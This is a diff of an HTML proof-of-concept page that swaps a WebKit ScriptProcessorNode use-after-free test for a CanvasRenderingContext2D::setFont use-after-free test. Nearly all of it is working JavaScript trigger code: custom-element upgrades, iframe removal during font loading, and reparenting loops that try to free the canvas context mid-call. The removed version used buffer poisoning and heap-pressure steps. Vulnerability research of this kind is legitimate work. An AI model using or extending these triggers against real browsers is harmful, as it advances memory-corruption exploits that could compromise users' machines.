@@ -2,42 +2,33 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>GLM-003 — ScriptProcessorNode UAF PoC</title>
+<title>VULN-004 — Canvas setFont UAF PoC</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body {
-  background: #0d0d0d;
-  color: #c9d1d9;
+  background: #0d0d0d; color: #c9d1d9;
   font-family: 'Courier New', monospace;
-  font-size: 13px;
-  padding: 20px;
+  font-size: 13px; padding: 20px;
 }
-h2 { color: #58a6ff; margin-bottom: 4px; font-size: 15px; }
-.sub { color: #8b949e; font-size: 11px; margin-bottom: 16px; }
+h2   { color: #58a6ff; margin-bottom: 4px; font-size: 15px; }
+.sub { color: #8b949e; font-size: 11px; margin-bottom: 14px; }
 #log {
-  background: #161b22;
-  border: 1px solid #30363d;
-  border-radius: 6px;
-  padding: 12px;
-  min-height: 200px;
-  max-height: 420px;
-  overflow-y: auto;
-  margin-bottom: 14px;
+  background: #161b22; border: 1px solid #30363d;
+  border-radius: 6px; padding: 12px;
+  min-height: 180px; max-height: 460px;
+  overflow-y: auto; margin-bottom: 12px;
 }
 .ok   { color: #3fb950; }
 .err  { color: #f85149; }
 .warn { color: #d29922; }
 .info { color: #58a6ff; }
-.hit  { color: #ff7b72; font-weight: bold; background: #3d1f1f; padding: 2px 6px; border-radius: 3px; }
+.hit  { color: #ff7b72; font-weight: bold;
+        background: #3d1f1f; padding: 2px 6px; border-radius: 3px; }
 button {
-  background: #21262d;
-  color: #c9d1d9;
-  border: 1px solid #30363d;
-  border-radius: 6px;
-  padding: 10px 22px;
-  font-family: inherit;
-  font-size: 13px;
-  cursor: pointer;
+  background: #21262d; color: #c9d1d9;
+  border: 1px solid #30363d; border-radius: 6px;
+  padding: 10px 22px; font-family: inherit;
+  font-size: 13px; cursor: pointer;
 }
 button:hover { background: #30363d; }
 button:disabled { opacity: .4; cursor: default; }
@@ -45,172 +36,319 @@ button:disabled { opacity: .4; cursor: default; }
 </head>
 <body>
 
-<h2>GLM-003 — ScriptProcessorNode::fireProcessEvent UAF</h2>
+<h2>VULN-004 — CanvasRenderingContext2D::setFont UAF</h2>
 <p class="sub">
-  Source: WebCore/Modules/webaudio/ScriptProcessorNode.cpp:231-252<br>
-  Target: raw AudioBuffer* used after dispatchEvent(audioprocess) with no Ref protection
+  Source: WebCore/html/canvas/CanvasRenderingContext2D.cpp:105–118<br>
+  Shape: raw <code>this</code> used after <code>updateStyleIfNeeded()</code> — comment in source confirms JS runs synchronously here
 </p>
 
 <div id="log"></div>
-<button id="btn">▶ Start Test (requires user gesture)</button>
+<button id="btn">▶ Run PoC</button>
 
 <!--
-  TRIGGER:
-    AudioBuffer* outputBuffer = m_outputBuffers[bufferIndex].get()  ← raw ptr, NO Ref
-    ...
-    dispatchEvent(AudioProcessingEvent)                              ← JS runs here
-    outputBufferForJS->copyTo(*outputBuffer)                         ← UAF if freed
-    outputBuffer->zero()                                             ← UAF if freed
+  C++ SHAPE:
+    void CanvasRenderingContext2D::setFont(const String& newFont)
+    {
+        Document& document = canvas().document();       // step 1
+        document.updateStyleIfNeeded();                 // step 2 — JS CAN RUN HERE
+        // comment L115: "updating style can cause JS to run synchronously"
+        setFontWithoutUpdatingStyle(newFont);           // step 3 — uses `this`
+    }
 
-  STRATEGY:
-    Phase 1 — baseline: confirm onaudioprocess fires, capture event.outputBuffer
-    Phase 2 — trigger:  inside event, disconnect ALL connections, force GC pressure,
-                         then poison event.outputBuffer channel data with 0xDEADBEEF
-    Phase 3 — verify:   if C++ reads poisoned data via stale ptr → detectable corruption
-                         if C++ crashes → UAF confirmed
+  TRIGGER STRATEGY:
+    We need JS to run SYNCHRONOUSLY inside updateStyleIfNeeded()
+    and during that JS we remove/destroy the canvas element.
+    If the CanvasRenderingContext2D is then freed, step 3 is a UAF.
 
-  EXPECTED: crash / ASAN heap-use-after-free in fireProcessEvent after dispatch
+  THREE VARIANTS tested in sequence:
+
+  VARIANT A — Custom Element upgrade during style update
+    Custom elements can have connectedCallback() run synchronously
+    during style recalculation if they are pending upgrade.
+    Insert a pending custom element, then call ctx.font = "..." to
+    trigger style update which processes pending upgrades.
+
+  VARIANT B — iframe srcdoc font + cross-frame canvas removal
+    Canvas in an iframe. Parent loads @font-face. When ctx.font triggers
+    style update inside the iframe, parent removes the iframe — destroying
+    the CanvasRenderingContext2D while setFont is mid-execution.
+
+  VARIANT C — document.write re-entrant style update
+    Call ctx.font during a script triggered by a style update cascade.
+    Verify whether re-entrant style updates can cause stale context.
+
+  EXPECTED: crash / hang / corrupted canvas output / ASAN heap-use-after-free
   OBSERVED: (fill after test)
 -->
 
 <script>
 'use strict';
 
-const $ = id => document.getElementById(id);
-const logEl = $('log');
-
+const logEl = document.getElementById('log');
 function log(msg, cls) {
   const d = document.createElement('div');
   d.className = cls || '';
-  const ts = performance.now().toFixed(1).padStart(8);
-  d.textContent = `[${ts}ms] ${msg}`;
+  d.textContent = `[${performance.now().toFixed(1).padStart(8)}ms] ${msg}`;
   logEl.appendChild(d);
   logEl.scrollTop = logEl.scrollHeight;
-  console.log(msg);
 }
-
 function sep() {
   const d = document.createElement('div');
-  d.style.cssText = 'border-top:1px solid #30363d;margin:4px 0';
+  d.style.cssText = 'border-top:1px solid #30363d;margin:5px 0';
   logEl.appendChild(d);
 }
 
-$('btn').addEventListener('click', async function() {
-  this.disabled = true;
-  sep();
-  log('=== GLM-003 ScriptProcessorNode UAF Test ===', 'info');
+// ═══════════════════════════════════════════════════════════
+// VARIANT A — Custom Element upgrade during style update
+// ═══════════════════════════════════════════════════════════
+function variantA() {
+  return new Promise(resolve => {
+    sep();
+    log('[A] Custom Element upgrade during updateStyleIfNeeded()', 'info');
 
-  // ── API check ────────────────────────────────────────────────────────────
-  const AC = window.AudioContext || window.webkitAudioContext;
-  if (!AC) {
-    log('[SKIP] AudioContext not available on this platform', 'err');
-    this.disabled = false;
-    return;
-  }
-  log('[OK] AudioContext available', 'ok');
+    // canvas we will try to destroy mid-setFont
+    const canvas = document.createElement('canvas');
+    canvas.width = 100; canvas.height = 100;
+    document.body.appendChild(canvas);
+    const ctx = canvas.getContext('2d');
+    if (!ctx) { log('[A] canvas 2d not available', 'err'); return resolve(false); }
 
-  const ctx = new AC();
-  if (typeof ctx.createScriptProcessor !== 'function') {
-    log('[SKIP] createScriptProcessor not available', 'err');
-    ctx.close(); this.disabled = false; return;
-  }
-  log('[OK] createScriptProcessor available', 'ok');
+    let upgradeFired = false;
+    let survived     = false;
 
-  if (ctx.state === 'suspended') {
-    await ctx.resume();
-    log('[OK] AudioContext resumed', 'ok');
-  }
+    // Define a custom element whose connectedCallback runs synchronously
+    // during style resolution. We delay definition until AFTER inserting
+    // the element so the upgrade is PENDING when setFont triggers style update.
+    const TAG = 'x-uaf-a-' + Date.now();
 
-  // ── Setup ────────────────────────────────────────────────────────────────
-  const BUFFER_SIZE = 256;
-  const proc = ctx.createScriptProcessor(BUFFER_SIZE, 1, 1);
-  const osc  = ctx.createOscillator();
-  osc.frequency.value = 220;
+    // Step 1: insert the element BEFORE defining it → sits as "unresolved"
+    const trigger = document.createElement(TAG);
+    document.body.appendChild(trigger);
+    log(`[A] inserted pending upgrade element <${TAG}>`, 'ok');
 
-  osc.connect(proc);
-  proc.connect(ctx.destination);
-  log(`[graph] osc(220Hz) → processor(${BUFFER_SIZE}) → destination`, 'info');
+    // Step 2: define now → upgrade is queued but fires synchronously
+    //         during the NEXT style recalculation
+    customElements.define(TAG, class extends HTMLElement {
+      connectedCallback() {
+        if (upgradeFired) return;
+        upgradeFired = true;
+        log('[A] connectedCallback() fired INSIDE updateStyleIfNeeded()!', 'warn');
+        log('[A] removing canvas now — this is inside C++ setFont execution', 'warn');
+        try {
+          canvas.remove();
+          // ctx (CanvasRenderingContext2D*) may now be freed
+          // C++ will call setFontWithoutUpdatingStyle(this) after returning
+          log('[A] canvas.remove() succeeded inside style update', 'warn');
+        } catch(e) {
+          log('[A] canvas.remove() threw: ' + e.message, 'err');
+        }
+      }
+    });
 
-  let phase = 0;
-  const POISON_A = 13371.0;   // 0x4650… in float32 — unusual marker
-  const POISON_B = 31337.0;
-
-  proc.onaudioprocess = function(ev) {
-    phase++;
-
-    // ── Phase 1: baseline ───────────────────────────────────────────────
-    if (phase === 1) {
-      log(`[phase 1] first fire — outputBuffer: ${ev.outputBuffer.numberOfChannels}ch, `
-        + `${ev.outputBuffer.length} frames`, 'ok');
-      return;
+    // Step 3: ctx.font triggers updateStyleIfNeeded()
+    //         → style recalc → custom element upgrade → connectedCallback → canvas.remove()
+    //         → updateStyleIfNeeded returns
+    //         → setFontWithoutUpdatingStyle(this)  ← this = freed context = UAF
+    log('[A] calling ctx.font — triggering updateStyleIfNeeded() ...', 'warn');
+    try {
+      ctx.font = '18px sans-serif'; // THE TRIGGER
+      survived = true;
+      log('[A] ctx.font returned — checking state', survived ? 'ok' : 'err');
+      if (upgradeFired) {
+        log('[A] connectedCallback fired AND setFont returned → inspect for silent corruption', 'warn');
+      } else {
+        log('[A] connectedCallback did NOT fire synchronously on this platform', 'info');
+      }
+    } catch(e) {
+      log('[A] EXCEPTION from ctx.font: ' + e.message, 'hit');
     }
 
-    // ── Phase 2: trigger ────────────────────────────────────────────────
-    if (phase === 2) {
-      log('[phase 2] TRIGGER — disconnecting graph inside dispatch', 'warn');
+    // cleanup
+    try { trigger.remove(); } catch(_) {}
+    try { canvas.remove();  } catch(_) {}
+    resolve(upgradeFired);
+  });
+}
 
-      // Step A: sever all audio connections synchronously while C++ holds
-      //         the raw AudioBuffer* pointer from m_outputBuffers[bufferIndex]
-      try { proc.disconnect(ctx.destination); } catch (_) {}
-      try { osc.disconnect(proc);             } catch (_) {}
-      log('  [step A] all connections severed', 'warn');
+// ═══════════════════════════════════════════════════════════
+// VARIANT B — iframe canvas removed from parent during setFont
+// ═══════════════════════════════════════════════════════════
+function variantB() {
+  return new Promise(resolve => {
+    sep();
+    log('[B] iframe canvas + parent removes iframe mid-setFont', 'info');
 
-      // Step B: poison event.outputBuffer — this IS the same C++ object that
-      //         outputBuffer* points to. If m_outputBuffers releases its ref
-      //         (ref-count → 0) the backing store is freed. We write markers
-      //         so any heap-use-after-free shows unusual data.
-      try {
-        const ch = ev.outputBuffer.getChannelData(0);
-        ch[0]              = POISON_A;
-        ch[BUFFER_SIZE - 1] = POISON_B;
-        log(`  [step B] wrote poison markers to outputBuffer channel 0`, 'warn');
-      } catch (e) {
-        log(`  [step B] exception writing to outputBuffer: ${e.message}`, 'err');
+    const iframe = document.createElement('iframe');
+    iframe.style.cssText = 'width:200px;height:200px;position:absolute;left:-9999px';
+    document.body.appendChild(iframe);
+
+    // Use srcdoc so we fully control the iframe content
+    iframe.srcdoc = `<!DOCTYPE html>
+<html><body>
+<canvas id="c" width="200" height="200"></canvas>
+<script>
+window._ctx = document.getElementById('c').getContext('2d');
+window._ready = true;
+<\/script>
+</body></html>`;
+
+    iframe.onload = function() {
+      const iwin = iframe.contentWindow;
+      if (!iwin || !iwin._ctx) {
+        log('[B] iframe ctx not available', 'err');
+        iframe.remove();
+        return resolve(false);
       }
 
-      // Step C: GC pressure — attempt to reclaim freed AudioBuffer backing store
-      //         If the C++ AudioBuffer was freed above, new allocations may
-      //         reclaim its memory → copyTo(*outputBuffer) writes to our data
-      let sink = [];
-      for (let i = 0; i < 800; i++) sink.push(new Float32Array(BUFFER_SIZE));
-      sink = null;
-      log('  [step C] GC pressure applied (800 × Float32Array)', 'warn');
+      const ctx = iwin._ctx;
+      log('[B] iframe canvas context obtained', 'ok');
 
-      log('[phase 2] returning from onaudioprocess —', 'warn');
-      log('          C++ now executes: outputBufferForJS->copyTo(*outputBuffer)', 'warn');
-      log('          C++ now executes: outputBuffer->zero()', 'warn');
-      log('          If outputBuffer was freed → heap-use-after-free', 'warn');
-      return;
+      // We'll remove the iframe from a MutationObserver on the inner canvas
+      // MutationObserver fires sync in some cases during style update
+      let triggered = false;
+      const mo = new MutationObserver(() => {
+        if (triggered) return;
+        triggered = true;
+        log('[B] MutationObserver fired — removing iframe now', 'warn');
+        try { iframe.remove(); } catch(_) {}
+      });
+      mo.observe(iframe.contentDocument.body, { childList: true, subtree: true });
+
+      // Also try direct removal via font load callback
+      if (iwin.document && iwin.document.fonts) {
+        iwin.document.fonts.onloadingdone = () => {
+          if (!triggered) {
+            triggered = true;
+            log('[B] fonts.onloadingdone inside iframe — removing iframe', 'warn');
+            try { iframe.remove(); } catch(_) {}
+          }
+        };
+      }
+
+      // Inject a @font-face that will be resolved during ctx.font assignment
+      const style = iwin.document.createElement('style');
+      // tiny valid woff2 (empty glyph set) encoded as data URI
+      style.textContent = `
+        @font-face {
+          font-family: 'UAFFont';
+          src: local('Arial'), local('Helvetica');
+          font-display: block;
+        }
+      `;
+      iwin.document.head.appendChild(style);
+
+      log('[B] calling iframe ctx.font with custom font family...', 'warn');
+      let survived = false;
+      try {
+        ctx.font = '16px UAFFont';
+        survived = true;
+        log('[B] ctx.font returned — iframe removed: ' + !document.contains(iframe), 'ok');
+      } catch(e) {
+        log('[B] EXCEPTION: ' + e.message, 'hit');
+      }
+
+      mo.disconnect();
+      try { iframe.remove(); } catch(_) {}
+      resolve(triggered && survived);
+    };
+  });
+}
+
+// ═══════════════════════════════════════════════════════════
+// VARIANT C — rapid repeated setFont with DOM mutation
+// ═══════════════════════════════════════════════════════════
+function variantC() {
+  return new Promise(resolve => {
+    sep();
+    log('[C] rapid setFont + concurrent DOM mutation loop', 'info');
+
+    const ITERATIONS = 200;
+    let crashed = false;
+
+    // Create a canvas, get ctx, then hammer setFont while
+    // concurrently reparenting/removing the canvas in between.
+    // If updateStyleIfNeeded ever catches us mid-removal, stale ctx.
+
+    const container = document.createElement('div');
+    document.body.appendChild(container);
+    const canvas = document.createElement('canvas');
+    canvas.width = 64; canvas.height = 64;
+    container.appendChild(canvas);
+    const ctx = canvas.getContext('2d');
+    if (!ctx) { log('[C] ctx not available', 'err'); return resolve(false); }
+
+    const fonts = [
+      '10px serif', '12px monospace', '14px sans-serif',
+      '16px Arial', '18px Georgia', '20px Verdana',
+    ];
+
+    // Alternate: setFont, then reparent canvas, then setFont again
+    // If style update in first setFont delays until reparent is processed,
+    // and during that we get JS re-entry, ctx may be stale.
+    for (let i = 0; i < ITERATIONS; i++) {
+      try {
+        ctx.font = fonts[i % fonts.length];
+
+        // Mid-loop: briefly detach and reattach canvas
+        if (i % 20 === 10) {
+          container.removeChild(canvas);
+          container.appendChild(canvas);
+        }
+
+        // Verify ctx is still functional
+        if (i % 50 === 0) {
+          const w = ctx.measureText('X').width;
+          if (isNaN(w) || w <= 0) {
+            log(`[C] measureText returned invalid at iteration ${i}: ${w}`, 'hit');
+            crashed = true;
+            break;
+          }
+        }
+      } catch(e) {
+        log(`[C] EXCEPTION at iteration ${i}: ${e.message}`, 'hit');
+        crashed = true;
+        break;
+      }
     }
 
-    // ── Phase 3: verify ─────────────────────────────────────────────────
-    if (phase === 3) {
-      sep();
-      log('[phase 3] still alive after trigger — checking for corruption', 'info');
-      log('  [result] no immediate crash observed', 'info');
-      log('  [note] sync uninitialize path not confirmed in this WebKit version', 'info');
-      log('  [note] UAF may require ASan build to observe memory poisoning', 'info');
-      log('  [note] try again after reloading with ASan-instrumented MiniBrowser', 'info');
-      sep();
-      osc.stop();
-      ctx.close();
-      $('btn').disabled = false;
-      $('btn').textContent = '↺ Run Again';
+    if (!crashed) {
+      log(`[C] survived ${ITERATIONS} iterations — no exception`, 'ok');
     }
-  };
 
-  osc.start();
-  log('[running] waiting for onaudioprocess fires...', 'info');
+    try { container.remove(); } catch(_) {}
+    resolve(crashed);
+  });
+}
 
-  // Watchdog: if onaudioprocess never fires, the platform blocked it
-  setTimeout(() => {
-    if (phase === 0) {
-      log('[watchdog] onaudioprocess did not fire in 6s', 'err');
-      log('           Web Audio may be blocked or suspended on this platform', 'err');
-      ctx.close();
-      $('btn').disabled = false;
-    }
-  }, 6000);
+// ═══════════════════════════════════════════════════════════
+// MAIN
+// ═══════════════════════════════════════════════════════════
+document.getElementById('btn').addEventListener('click', async function() {
+  this.disabled = true;
+  log('=== VULN-004 CanvasRenderingContext2D::setFont UAF ===', 'info');
+  log('Source: updateStyleIfNeeded() runs JS synchronously — no Ref<> protectedThis', 'info');
+  sep();
+
+  const rA = await variantA();
+  const rB = await variantB();
+  const rC = await variantC();
+
+  sep();
+  log('=== SUMMARY ===', 'info');
+  log(`Variant A (custom element upgrade):   ${rA ? 'TRIGGERED ← interesting' : 'not triggered'}`,
+      rA ? 'warn' : 'ok');
+  log(`Variant B (iframe font + removal):    ${rB ? 'TRIGGERED ← interesting' : 'not triggered'}`,
+      rB ? 'warn' : 'ok');
+  log(`Variant C (rapid setFont + reparent): ${rC ? 'EXCEPTION/CORRUPT'      : 'survived'}`,
+      rC ? 'hit'  : 'ok');
+
+  if (!rA && !rB && !rC) {
+    log('No trigger path confirmed on this platform.', 'info');
+    log('updateStyleIfNeeded may not allow synchronous JS re-entry here.', 'info');
+  }
+
+  this.textContent  = '↺ Run Again';
+  this.disabled     = false;
 });
 </script>
 </body>
